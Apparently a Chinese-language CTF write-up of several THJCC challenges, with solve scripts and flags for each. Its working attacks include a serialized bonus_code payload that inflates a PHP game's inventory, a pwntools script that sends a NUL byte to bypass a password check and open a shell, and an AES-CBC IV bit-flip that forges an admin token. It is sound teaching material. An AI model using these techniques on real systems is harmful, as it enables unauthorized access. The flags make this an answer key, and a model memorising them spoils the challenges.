            if(isset($_SESSION["inventory"][$key]) && is_numeric($value)){
                $_SESSION["inventory"][$key] += $value;
            }
        }
    }
}

if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"] + $_SESSION["inventory"]["SSR"] >= 10){
        exit("$flag");
    } else {
        exit('你的帳號不值錢！');
    }
}

$draw_result = "";
if(isset($_GET["draw1"])){
    if($_SESSION["balance"] < 40){
        $draw_result = "寶石不足！";
    } else {
        $_SESSION["balance"] -= 40;
        $draw_result = "恭喜獲得：" . implode("、", draw(1));
    }
} elseif(isset($_GET["draw10"])){
    if($_SESSION["balance"] < 200){
        $draw_result = "寶石不足！";
    } else {
        $_SESSION["balance"] -= 200;
        $draw_result = "恭喜獲得：" . implode("、", draw(6));
    }
}

function draw($n){
    $out = [];
    for($i = 1; $i <= $n; $i++){
        $r = lcg_value();
        $out[] = lookup($r);
    }
    return $out;
}

function lookup($r){
    if($r <= 0.001){
        $_SESSION["inventory"]["UR"] += 1;
        return "UR 極稀有";
    } elseif($r <= 0.004){
        $_SESSION["inventory"]["SSR"] += 1;
        return "SSR 超級稀有";
    } elseif($r <= 0.009){
        $_SESSION["inventory"]["SR"] += 1;
        return "SR 稀有";
    } elseif($r <= 0.016){
        $_SESSION["inventory"]["R"] += 1;
        return "R 高級";
    } else {
        $_SESSION["inventory"]["N"] += 1;
        return "N 普通";
    }
}

$characterNames = [
    "UR" => "傳說守護者",
    "SSR" => "超級英雄",
    "SR" => "精英戰士",
    "R" => "勇敢士兵",
    "N" => "新手戰士"
];
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lime RANGER</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Lime RANGER</h1>
        </div>
        
        <div class="user-info">
            <div class="balance">
                <div class="balance-icon">💎</div>
                <div class="balance-info">
                    <span>你的寶石</span>
                    <strong><?=$_SESSION["balance"];?></strong>
                </div>
            </div>
            <div class="user-id">玩家ID: <?=session_id();?></div>
        </div>
        
        <div class="inventory">
            <h3>你的角色收藏</h3>
            <div class="inventory-grid">
                <div class="inventory-item UR">
                    <h4>UR</h4>
                    <p><?=$_SESSION["inventory"]["UR"];?></p>
                    <small><?=$characterNames["UR"];?></small>
                    <div class="character-tooltip">極稀有角色，機率：0.1%</div>
                </div>
                <div class="inventory-item SSR">
                    <h4>SSR</h4>
                    <p><?=$_SESSION["inventory"]["SSR"];?></p>
                    <small><?=$characterNames["SSR"];?></small>
                    <div class="character-tooltip">超級稀有角色，機率：0.3%</div>
                </div>
                <div class="inventory-item SR">
                    <h4>SR</h4>
                    <p><?=$_SESSION["inventory"]["SR"];?></p>
                    <small><?=$characterNames["SR"];?></small>
                    <div class="character-tooltip">稀有角色，機率：0.5%</div>
                </div>
                <div class="inventory-item R">
                    <h4>R</h4>
                    <p><?=$_SESSION["inventory"]["R"];?></p>
                    <small><?=$characterNames["R"];?></small>
                    <div class="character-tooltip">高級角色，機率：0.7%</div>
                </div>
                <div class="inventory-item N">
                    <h4>N</h4>
                    <p><?=$_SESSION["inventory"]["N"];?></p>
                    <small><?=$characterNames["N"];?></small>
                    <div class="character-tooltip">普通角色，機率：98.4%</div>
                </div>
            </div>
        </div>
        
        <form class="draw-buttons" method="GET">
            <button type="submit" name="draw1" class="draw-button">
                單抽
                <span class="draw-cost">消耗40寶石</span>
            </button>
            <button type="submit" name="draw10" class="draw-button premium">
                5+1連抽
                <span class="draw-cost">消耗200寶石</span>
            </button>
        </form>
        
        <form class="sellacc-container" method="GET">
            <button type="submit" name="sellacc" class="draw-button sellacc-button">
                出售帳號
            </button>
        </form>
        
        <div class="bonus-section">
            <h3>活動獎勵</h3>
            <p>輸入獎勵碼以領取額外角色</p>
            <form method="GET">
                <input type="text" name="bonus_code"size="80">
                <button type="submit">領取獎勵</button>
            </form>
        </div>
        
        <?php if($draw_result): ?>
        <div class="result">
            <h2>抽獎結果</h2>
            <p><?=$draw_result;?></p>
        </div>
        <?php endif; ?>
        
        <div class="footer">
            <span>© 2025 Lime RANGER</span>
            <a href="?view" class="source-link">查看源碼</a>
        </div>
    </div>
    
    <script>
        function createSparkles() {
            const items = document.querySelectorAll('.inventory-item.UR, .inventory-item.SSR');
            items.forEach(item => {
                for(let i = 0; i < 3; i++){
                    const sparkle = document.createElement('div');
                    sparkle.classList.add('sparkle');
                    const posX = Math.random() * 100;
                    const posY = Math.random() * 100;
                    sparkle.style.left = `${posX}%`;
                    sparkle.style.top = `${posY}%`;
                    const size = 3 + Math.random() * 3;
                    sparkle.style.width = `${size}px`;
                    sparkle.style.height = `${size}px`;
                    const hue = item.classList.contains('UR') ? '45' : '210';
                    sparkle.style.background = `hsl(${hue}, 100%, 75%)`;
                    const duration = 1 + Math.random() * 2;
                    const delay = Math.random() * 2;
                    sparkle.style.animation = `sparkle ${duration}s infinite ${delay}s`;
                    item.appendChild(sparkle);
                }
            });
        }
        
        window.addEventListener('DOMContentLoaded', () => {
            createSparkles();
            const buttons = document.querySelectorAll('.draw-button');
            buttons.forEach(button => {
                button.addEventListener('click', function(){
                    this.style.transform = 'scale(0.95)';
                    setTimeout(() => {
                        this.style.transform = '';
                    }, 100);
                });
            });
        });
    </script>
</body>
</html>


Solve
```
核心點在 bonus_code 那段，透過隨意往網頁上的欄位輸入內容得知 payload 會反應在網址上（?bonus_code=a%3A2%3A%3A%2...........）

解題步驟：
1. 準備 payload
我們要傳一個 bonus_code，使得
```
$_SESSION["inventory"]["UR"] += ?;
$_SESSION["inventory"]["SSR"] += ?;
```
目標為讓 UR+SSR >= 10

PHP: 
```
<?php
$payload = array("UR"=>5, "SSR"=>5);
echo urlencode(serialize($payload));
?>
```
以上會輸出：
```
a:2:{s:2:"UR";i:5;s:3:"SSR";i:5;}
```
再將此段 payload 傳入網址參數：
```
?bonus_code=a%3A2%3A%7Bs%3A2%3A%22UR%22%3Bi%3A5%3Bs%3A3%3A%22SSR%22%3Bi%3A5%3B%7D
```
再訪問出售頁面

**Flag: THJCC{lin3_r4nGeR_13_1ncreD!Ble_64m3?}**

## Insecure Shell

Hint: SSH is outdated, ISSH is a more convenient alternative(雖然我不知道這個 Hint 的用意)

chal.c: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h> // for read()

void init()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int check_password(char *a, char *b, int length)
{
    for (int i = 0; i < length; i++)
        if (a[i] != b[i])
            return 1;
    return 0;
}

int main()
{
    init();

    char password[0x10];
    char buf[0x10];

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0)
    {
        printf("Error opening /dev/urandom. If you see this. call admin\n");
        return 1;
    }
    read(fd, password, 15);

    printf("Enter the password >");
    scanf("%15s", buf);

    if (check_password(password, buf, strlen(buf)))
        printf("Wrong password!\n");
    else
        system("/bin/sh");

    return 0;
}
```

* 這段程式的功能是產生一組隨機密碼（15 bytes），提示使用者輸入密碼，如果輸入正確就執行 /bin/sh 打開 shell，否則顯示「Wrong password!」。
* 漏洞 : 不初始化 password[15]：雖然只讀了 15 bytes，但 password 陣列共 16 bytes，最後一個位元沒有設定。使用者長度決定比對長度，比對只跑到strlen(buf)，如果使用者輸入的第一個字元就是 '\0'（也就是空字串），那麼 strlen(buf) 等於 0，check_password 根本不會進入迴圈就直接回傳「相等」，立即繞過檢查。

exploit.py: 
```
from pwn import *
import os

# 切換本地或遠端
LOCAL = True

p = remote('chal.ctf.scint.org', 10004)

# 1) 等提示
p.recvuntil(b'Enter the password >')

# 2) 發送一個 NUL byte 繞過 strlen 比對
#    sendline 會自動在後面加上 '\n'
p.sendline(b'\x00')

# 3) 送出 cat flag.txt 取得旗標
p.sendline(b'cat flag.txt')

# 4) 讀出並列印 flag
flag = p.recvline(timeout=2).decode().strip()
print("FLAG:", flag)

p.interactive()
```
**Flag: THJCC{H0w_did_you_tyPE_\x00?}**

## time_GEM

Hint: I used the Time GEM to put the flag to sleep...

此題提供一個 Linux ELF 可執行檔 envy，執行後會印出 Flag 已沉睡，請喚醒 Flag。於是用 IDA 打開後發現有一段加密的字串`char enc[] = {
  0x18, 0x2A, 0x19, 0x14, 0x2F, 0x17, ... // 類似這種形式
};
`
解密函式中使用某種 XOR 加上偏移與時間有關的邏輯進行處理，解密完的結果即為 Flag。
* XOR 邏輯大致為：
decrypted[i] = encrypted[i] ^ key[i % keylen]
* 解法策略：
由於程式啟動後才 sleep，也就是 time(NULL) 時間早已固定，所以可以直接在 sleep 之前暫停下來、取得時間種子（或直接 patch sleep 後進行分析）。

將解密邏輯轉為 Python 腳本，代入加密字串與固定參數，即可還原 flag。
```
# Construct cipher list using list of offsets and values manually transcribed above:

# 共 67 個 bytes
offset_values = {
    0x2060:0x00,0x2064:0x01,0x2068:0x02,0x206C:0x03,0x2070:0x04,
    0x2074:0x37,0x2078:0x1D,0x207C:0x64,0x2080:0x30,0x2084:0x11,
    0x2088:0x0C,0x208C:0x1B,0x2090:0x2D,0x2094:0x2A,0x2098:0x15,
    0x209C:0x18,0x20A0:0x00,0x20A4:0x71,0x20A8:0x08,0x20AC:0x3F,
    0x20B0:0x0E,0x20B4:0x04,0x20B8:0x6B,0x20BC:0x63,0x20C0:0x17,
    0x20C4:0x67,0x20C8:0x49,0x20CC:0x5F,0x20D0:0x7C,0x20D4:0x19,
    0x20D8:0x65,0x20DC:0x6B,0x20E0:0x3A,0x20E4:0x37,0x20E8:0x1A,
    0x20EC:0x40,0x20F0:0x1E,0x20F4:0x2E,0x20F8:0x0D,0x20FC:0x37,
    0x2100:0x58,0x2104:0x2C,0x2108:0x52,0x210C:0x55,0x2110:0x3C,
    0x2114:0x12,0x2118:0x4A,0x211C:0x29,0x2120:0x42,0x2124:0x25,
    0x2128:0x4E,0x212C:0x1E,0x2130:0x2C,0x2134:0x40,0x2138:0x5E,
    0x213C:0x5B,0x2140:0x29,0x2144:0x5C,0x2148:0x5D,0x214C:0x46,
    0x2150:0x42,0x2154:0x5A,0x2158:0x50,0x215C:0x4D,0x2160:0x2E,
    0x2164:0x27,0x2168:0x70 
}

cipher = []
for i in range(67):
    offset = 0x2060 + 4*i
    cipher.append(offset_values[offset])

# key
key = b"THJCCISSOGOODIMNOTTHEFLAG!!!"

# decrypt
flag = ""
for i,c in enumerate(cipher):
    k = key[i % len(key)] ^ (i % 256)
    flag += chr(k ^ c)

print(flag)
```
**Flag: THJCC{H0w_I_enVY_4Nd_W15H_re4L17Y_k0uLd_4L50_k0N7R0l_TIME-->=.=!!!}**

## Flag Checker

在 IDA 打開題目提供的 chal 檔案，查看 main function 重點:
* 輸入 flag 並存入 s：
```
printf("flag >");
__isoc99_scanf("%255s", s);
```
用戶輸入會存入 s，最多 255 個字元（但 s 大小只有 8 bytes）。
* 對每個字元進行處理：
```
for ( i = 0; i < strlen(s); ++i )
    s[i] = ((s[i] << (i & 7)) | (s[i] >> (-(char)i & 7))) ^ 0xF;
```
這是個類似 rotate left/right + XOR 的加密方式。
`(i & 7)` 其實就是 ` i % 8`。
`(-(char)i & 7)` 是一種技巧，等價於 `(8 - (i % 8)) % 8`。
* 接著丟進一個叫 sub_11C9 的函數做驗證。

sub_11c9:
```
__int64 __fastcall sub_11C9(__int64 a1)
{
  signed int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; (unsigned int)i <= 0x20; i += 3 )
  {
    if ( *(unsigned __int8 *)(i + a1) + *(unsigned __int8 *)(i + 1LL + a1) != dword_4020[i] )
      return 0;
    if ( *(unsigned __int8 *)(i + 1LL + a1) + *(unsigned __int8 *)(i + 2LL + a1) != dword_4020[i + 1] )
      return 0;
    if ( *(unsigned __int8 *)(i + a1) + *(unsigned __int8 *)(i + 2LL + a1) != dword_4020[i + 2] )
      return 0;
  }
  return 1;
}
```
sub_11C9 做了類似 checksum 檢查。每**三個字元**一組，形成**三個加法條件**，總共會檢查 33 個 bytes。也就是說 s（或它 overflow 寫到的區域）至少需要提供 33 個有效 byte。接著再從 sub_11C9 中提到的 dword_4020 找出 33 個 bytes 進行解密。

```
dword_4020 = [
    0xFA, 0xC5, 0x81, 0x50, 0x9B, 0x75, 0x72, 0x6D, 0xA5, 0xB5,
    0x100, 0xD1, 0x171, 0x1C1, 0x160, 0x13B, 0x163, 0x1A2, 0xF7,
    0x167, 0x184, 0x155, 0x174, 0x121, 0xD1, 0x8D, 0x80, 0x181,
    0x174, 0x1DD, 0x50, 0x0, 0x50
]

# 還原加密後的 s
s_enc = []

for i in range(0, 33, 3):
    d0 = dword_4020[i]
    d1 = dword_4020[i+1]
    d2 = dword_4020[i+2]

    x = (d0 - d1 + d2) // 2
    y = d0 - x
    z = d1 - y

    s_enc.extend([x, y, z])

# 還原原始輸入（被加密前的）
def decrypt_byte(b, i):
    b ^= 0xF
    b = ((b >> (i & 7)) | (b << (8 - (i & 7)))) & 0xFF
    return b

flag = ''.join(chr(decrypt_byte(b, i)) for i, b in enumerate(s_enc))

print(f"[+] Flag: {flag}")
```
**Flag: THJCC{i$_&_0x7_equaL_to_m0D_8?}**

## Setsuna Message

Message: 
```
D'`A@^8!}}Y32DC/eR,>=/('9JIkFh~ffAAca=+u)\[qpun4lTpih.lNdihg`_%]E[Z_X|\>ZSwQVONr54PINGkEJCHG@d'&BA@?8\<|43Wx05.R,10/('Kl$)"!E%e{z@~}v<z\rqvutm3Tpihmf,dLhgf_%FE[`_X]Vz=YXQPta
```
Hint1: Some things will not succeed if you just observe them. You need to execute them so that they can lead you to the final path.

Hint2: Having said that, his level of chaos is beyond imagination. Although it is not as exaggerated as the 18th level of hell, it can be regarded as the 8th level of hell.

根據提示猜測這是一段程式碼，需要被執行，而Malbolge 是最可能的語言。它正是以「難讀」與「地獄級難度」著稱，符合「8th level of hell」這種形容。於是至 [Malbolge online](https://www.tutorialspoint.com/compilers/online-malbolge-compiler.htm) 執行後跑出`VEhKQ0N7QHIhc3UhMXl9`，再用 base64 解碼出 Flag。
**Flag: THJCC{@r!su!1y}**

## Yoshino's Secret

這個題目提供了一個使用 AES-CBC 加密模式的身份驗證系統。
chal.py:
```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from secret import FLAG
import json
import os

KEY = os.urandom(16)  # 隨機生成16位元的AES密鑰

def encrypt(plaintext: bytes) -> bytes:
    iv = plaintext[:16]  # 使用明文的前16個字節作為IV
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext[16:], AES.block_size))

def decrypt(ciphertext: bytes) -> str:
    iv = ciphertext[:16]  # 將密文的前16個字節作為IV
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
    return plaintext

def check(token):
    try:
        token = bytes.fromhex(token)
        passkey = decrypt(token)
        data = json.loads(passkey)
        if data["admin"]:  # 如果admin為true，則輸出FLAG
            print(f"Here is your flag: {FLAG}")
            exit()
        else:
            print("Access Denied")
    except:
        print("Hacker detected, emergency shutdown of the system")
        exit()

def main():
    passkey = b'{"admin":false,"id":"TomotakeYoshino"}'  # 預設admin為false
    token = encrypt(os.urandom(16) + passkey)  # 生成token
    print(f"token: {token.hex()}")
    while True:
        token = input("token > ")
        check(token)
```
* 攻擊策略:
目標是將 "admin":false 改為 "admin":true （注意後面有空格，保持字串長度不變）。我們可以利用 **CBC 模式**的特性，通過修改IV (即token的前16個字節) 來影響解密後的結果。具體來說如果我們修改 IV 中的第 i 個字節，它會直接影響解密後明文的第i個字節這種影響是通過 XOR 操作進行的，所以我們可以精確控制明文的變化。
* 實際攻擊步驟
獲取原始token
將其從十六進制轉換為字節
分離IV (前16個字節) 和密文 (其餘部分)
確定 "false" 在明文中的位置
通過XOR操作修改IV中對應位置的字節，使得解密後 "false" 變為 "true "

解題腳本:
```
# 首先运行原程序获取一个token
# 假设获取到的token是hexstring

# 然后进行以下操作
import binascii

def solve(original_token_hex):
    # 1. 将token从hex转换为bytes
    token = bytes.fromhex(original_token_hex)
    
    # 2. 分离IV和密文
    iv = bytearray(token[:16])
    ciphertext = token[16:]
    
    # 3. 我们知道解密后的明文是 {"admin":false,"id":"TomotakeYoshino"}
    # 需要修改的是 "false" 变成 "true "
    # 确定 "false" 在第一个块中的位置
    # 假设 "admin":false 在明文的前16个字节内
    # 从明文位置 {"admin":f 开始算起，false的位置大概在第10个字节开始
    
    # 我们要修改的位置
    positions = {
        9: ord('f') ^ ord('t'),  # 修改 f -> t
        10: ord('a') ^ ord('r'),  # 修改 a -> r
        11: ord('l') ^ ord('u'),  # 修改 l -> u
        12: ord('s') ^ ord('e'),  # 修改 s -> e
        13: ord('e') ^ ord(' ')   # 修改 e -> 空格
    }
    
    # 4. 在IV中进行位翻转
    for pos, xor_val in positions.items():
        iv[pos] ^= xor_val
    
    # 5. 组合修改后的IV和原始密文
    modified_token = bytes(iv) + ciphertext
    
    # 6. 转换回hex格式
    return modified_token.hex()

# 使用程序获得的token
# 运行程序，复制程序输出的token
original_token = input("请输入原始token: ")

# 生成修改后的token
modified_token = solve(original_token)
print("修改后的token:")
print(modified_token)
```
**Flag: THJCC{F1iP_Ou7_y0$Hino's_53Cr3t}**

## Hidden in memory...
Hint: Find the computer name and submit with THJCC{computername}

下載題目的 memdump.rar 後解壓縮得到 memdump.dmp，根據題目指示輸入`!PEB`得到 `COMPUTERNAME=WH3R3-Y0U-G3TM3`

**Flag: THJCC{WH3R3-Y0U-G3TM3}**